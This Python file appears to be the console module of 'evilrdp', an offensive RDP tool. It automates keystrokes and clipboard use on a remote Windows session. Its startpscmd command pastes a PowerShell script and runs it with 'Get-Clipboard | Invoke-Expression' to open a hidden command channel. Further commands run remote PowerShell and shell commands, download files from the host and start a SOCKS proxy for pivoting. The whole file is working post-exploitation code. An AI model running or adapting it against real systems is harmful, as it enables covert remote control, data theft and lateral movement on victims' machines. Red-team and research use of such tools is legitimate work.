import os
import traceback
import datetime
import asyncio

from evilrdp.external.aiocmd.aiocmd import aiocmd
from aardwolf.commons.queuedata.keyboard import RDP_KEYBOARD_SCANCODE, RDP_KEYBOARD_UNICODE
from aardwolf.connection import RDPConnection
from aardwolf.commons.queuedata.constants import MOUSEBUTTON, VIDEO_FORMAT
from aardwolf.keyboard.layoutmanager import KeyboardLayoutManager
from aardwolf.utils.ducky import DuckyExecutorBase, DuckyReaderFile
from aardwolf.commons.target import RDPConnectionDialect
from aardwolf.keyboard import VK_MODIFIERS

from evilrdp.vchannels.pscmd import PSCMDChannel

class EVILRDPConsole(aiocmd.PromptToolkitCmd):
	def __init__(self, rdpconn:RDPConnection):
		aiocmd.PromptToolkitCmd.__init__(self, ignore_sigint=False) #Setting this to false, since True doesnt work on windows...
		self.rdpconn = rdpconn
		self.pscmd_channelname = 'PSCMD'

	async def do_info(self):
		print('HELLO!')

	async def do_mousemove(self, x, y):
		"""Moves the mouse to the given coordinates"""
		await self.rdpconn.send_mouse(MOUSEBUTTON.MOUSEBUTTON_LEFT, int(x), int(y), False)

	async def do_rightclick(self, x, y):
		"""Emulates a rightclick on the given coordinates"""
		for clicked in [True, False]:
			await self.rdpconn.send_mouse(MOUSEBUTTON.MOUSEBUTTON_RIGHT, int(x), int(y), clicked)
	
	async def do_doubleclick(self, x, y):
		"""Emulates a doubleclick on the given coordinates"""
		for clicked in [True, False, True, False]:
			await self.rdpconn.send_mouse(MOUSEBUTTON.MOUSEBUTTON_LEFT, int(x), int(y), clicked)

	async def do_type(self, string, chardelay = 0):
		"""Types the given string on the remote end"""
		chardelay = int(chardelay)
		for c in string:
			await self.rdpconn.send_key_char(c, True)
			await asyncio.sleep(chardelay/1000)
			await self.rdpconn.send_key_char(c, False)
	
	async def do_return(self):
		await self.do_enter()

	async def do_enter(self):
		"""Hits the Return button on the remote end"""
		await self.rdpconn.send_key_scancode(28, True, False)
		await self.rdpconn.send_key_scancode(28, False, False)
	
	async def do_invokerun(self):
		"""Hits WIN+R"""
		await self.rdpconn.send_key_scancode(57435, True, True)
		await asyncio.sleep(100/1000)
		await self.rdpconn.send_key_scancode(0x13, True, False)
		await asyncio.sleep(0.5)
		await self.rdpconn.send_key_scancode(0x13, False, False)
		await asyncio.sleep(100/1000)
		await self.rdpconn.send_key_scancode(57435, False, True)
	
	async def do_clipboardset(self, text):
		"""Sets the clipboard text on the remote end"""
		await self.rdpconn.set_current_clipboard_text(text)
	
	async def do_clipboardsetfile(self, filepath):
		"""Sets the clipboard text on the remote end from a local textfile"""
		with open(filepath, 'r') as f:
			text = f.read()
		await self.do_clipboardset(text)
	
	async def do_clipboardget(self, outfile = None):
		"""Gets the clipboard text from the remote end"""
		clipdata = await self.rdpconn.get_current_clipboard_text()
		if outfile is not None and len(outfile) > 0:
			with open(outfile, 'wb') as f:
				f.write(clipdata.encode())
		else:
			print(clipdata)

	async def do_typefile(self, fname, chardelay = 1/10000):
		"""Types the contents of a text file line-by-line"""
		with open(fname, 'r') as f:
			for line in f:
				line = line.rstrip()
				await self.do_type(line+'\n', chardelay=chardelay)
				await asyncio.sleep(100/1000)
		print('Done!')
	
	async def do_powershell(self):
		"""Invokes a powershell prompt on the remote end"""
		await self.do_invokerun()
		await asyncio.sleep(100/1000)
		await self.do_type('powershell')
		await asyncio.sleep(100/1000)
		await self.do_enter()
	
	async def do_disconnect(self):
		"""Exit the RDP session"""
		await self.rdpconn.terminate()

	async def do_quit(self):
		"""Exit the RDP session"""
		await self.do_disconnect()

	async def do_screenshot(self):
		"""Takes a screenshot"""
		imgdata = self.rdpconn.get_desktop_buffer(VIDEO_FORMAT.PNG)
		fname = 'screenshot_%s.png' % datetime.datetime.utcnow().strftime("%Y_%m_%d_%H%MZ")
		with open(fname, 'wb') as f:
			f.write(imgdata)
		print('Screenshot data saved! %s' % fname)

	#async def do_duckyfile(self, dfile):
	#	try:
	#		async def ducky_keyboard_sender(scancode, is_pressed, as_char = False):
	#			### Callback function for the duckyexecutor to dispatch scancodes/characters to the remote end
	#			try:
	#				#print('SCANCODE: %s' % scancode)
	#				#print('is_pressed: %s' % is_pressed)
	#				#print('as_char: %s' % as_char)
	#				if as_char is False:
	#					ki = RDP_KEYBOARD_SCANCODE()
	#					ki.keyCode = scancode
	#					ki.is_pressed = is_pressed
	#					ki.modifiers = VK_MODIFIERS(0)
	#					await self.rdpconn.ext_in_queue.put(ki)
	#				else:
	#					ki = RDP_KEYBOARD_UNICODE()
	#					ki.char = scancode
	#					ki.is_pressed = is_pressed
	#					await self.rdpconn.ext_in_queue.put(ki)
	#			except Exception as e:
	#				traceback.print_exc()
	#			
	#		layout = KeyboardLayoutManager().get_layout_by_shortname(self.rdpconn.iosettings.client_keyboard)
	#		executor = DuckyExecutorBase(layout, ducky_keyboard_sender, send_as_char = True if self.rdpconn.target.dialect == RDPConnectionDialect.VNC else False)
	#		reader = DuckyReaderFile.from_file(dfile, executor)
	#		await reader.parse()
	#
	#	except Exception as e:
	#		traceback.print_exc()

	async def do_pscmdchannel(self, channelname = None):
		"""Changes the PSCMD channel's name"""
		if channelname is None or len(channelname) == 0:
			print('Current PSCMD channel name: %s' % self.pscmd_channelname)
			return
		self.pscmd_channelname = channelname
		await self.do_pscmdchannel(self)

	async def do_startpscmd(self, channelname = 'PSCMD'):
		"""Starts a PSCMD channel on the remote end"""
		if channelname not in self.rdpconn.get_vchannels():
			await self.rdpconn.add_vchannel(channelname, PSCMDChannel(channelname))
		basedir = os.path.dirname(os.path.abspath(__file__))
		scriptfile = os.path.join(basedir, 'vchannels', 'pscmd', 'serverscript.ps1')
		await self.do_powershell()
		await asyncio.sleep(0)
		await self.do_clipboardsetfile(scriptfile)
		await asyncio.sleep(1)
		await self.do_type('Get-Clipboard | Invoke-Expression')
		await self.do_return()
	
	async def do_pscmd(self, cmd):
		"""Executes a powershell command on the remote host. Requires PSCMD"""
		try:
			if self.pscmd_channelname not in self.rdpconn.iosettings.vchannels:
				print('PSCMD channel was either not defined while connecting OR the channel name is not the default.')
				print('Set the correct channel name using "pscmdchannel" command')
				return
			vchannel = self.rdpconn.iosettings.vchannels[self.pscmd_channelname]
			if vchannel.channel_active_evt.is_set() is False:
				print('Channel is defined, but is not active. Did you execute the client code on the server?')
				return
			response = await vchannel.sendrcv_pscmd(cmd)
			print(repr(response))
			for line in response.split('\n'):
				print(line.strip())

		except Exception as e:
			traceback.print_exc()

	async def do_getfile(self, filepath, dstfilepath):
		"""Downloads a remote file. Requires PSCMD"""
		try:
			if self.pscmd_channelname not in self.rdpconn.iosettings.vchannels:
				print('PSCMD channel was either not defined while connecting OR the channel name is not the default.')
				print('Set the correct channel name using "pscmdchannel" command')
				return
			vchannel = self.rdpconn.iosettings.vchannels[self.pscmd_channelname]
			if vchannel.channel_active_evt.is_set() is False:
				print('Channel is defined, but is not active. Did you execute the client code on the server?')
				return
			
			print('Downloading file...')
			with open(dstfilepath, 'wb') as f:
				async for response in vchannel.sendrcv_getfile(filepath):
					f.write(response)

			print('%s Downloaded to %s' % (filepath, dstfilepath))
		except Exception as e:
			traceback.print_exc()

	async def do_shell(self, cmd):
		"""Executes a shell command. Requires PSCMD"""
		try:
			if self.pscmd_channelname not in self.rdpconn.iosettings.vchannels:
				print('PSCMD channel was either not defined while connecting OR the channel name is not the default.')
				print('Set the correct channel name using "pscmdchannel" command')
				return
			vchannel = self.rdpconn.iosettings.vchannels[self.pscmd_channelname]
			if vchannel.channel_active_evt.is_set() is False:
				print('Channel is defined, but is not active. Did you execute the client code on the server?')
				return
			async for stderr_or_stout, response in vchannel.sendrcv_shellexec(cmd):
				for line in response.split('\n'):
					line = line.strip()
					print(line)

		except Exception as e:
			traceback.print_exc()
	
	#async def do_socksoverrdp(self, channelname = '', listen_ip = '127.0.0.1', listen_port = 9998):
	#	
	#from aardwolf.extensions.RDPEDYC.vchannels.socksoverrdp import SocksOverRDPChannel
	#iosettings.vchannels['PROXY'] = SocksOverRDPChannel(args.sockschannel, args.socksip, args.socksport)
	#	iosettings.vchannels[args.sockschannel] = SocksOverRDPChannel(args.sockschannel, args.socksip, args.socksport)

	async def do_socksproxy(self, listen_ip = '127.0.0.1', listen_port = 9999):
		"""Creates a socks proxy. Requires PSCMD"""
		try:
			if self.pscmd_channelname not in self.rdpconn.iosettings.vchannels:
				print('PSCMD channel was either not defined while connecting OR the channel name is not the default.')
				print('Set the correct channel name using "pscmdchannel" command')
				return
			vchannel = self.rdpconn.iosettings.vchannels[self.pscmd_channelname]
			if vchannel.channel_active_evt.is_set() is False:
				print('Channel is defined, but is not active. Did you execute the client code on the server?')
				return
			if listen_ip is None or len(listen_ip) == 0:
				listen_ip = '127.0.0.1'
			if listen_port is None:
				listen_port = 9999
			_, err = await vchannel.socksproxy(listen_ip, int(listen_port))
			if err is not None:
				print('Failed to start proxy server! Reason: %s' % err)
				return

		except Exception as e:
			traceback.print_exc()
	